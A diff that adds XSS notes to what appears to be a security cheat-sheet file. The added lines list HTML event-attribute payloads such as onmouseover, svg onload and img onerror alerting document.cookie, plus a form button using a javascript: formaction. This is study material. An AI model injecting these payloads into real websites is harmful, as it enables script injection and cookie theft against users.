@@ -93,6 +93,20 @@ that passes the sanitation
 - see https://mahmoudsec.blogspot.com/2015/09/how-i-found-xss-vulnerability-in-google.html
 
 
+There are HTML attributes that executes javascript
+For example, these HTML
+Event Attributes that execute JavaScript being outside a <script> tag:
+<b onmouseover=alert('XSS')>Click Me!</b>
+<svg onload=alert(1)>
+<body onload="alert('XSS')">
+<img src="http://test.cyberspacekittens.com"
+onerror=alert(document.cookie);>
+
+See https://html5sec.org/
+Turning HTML Injection into XSS
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+
+
 BROWSERS HACKERS HANDBOOK
 URL OBFUSCATION
 The following are ways in which to obfuscate a URL:
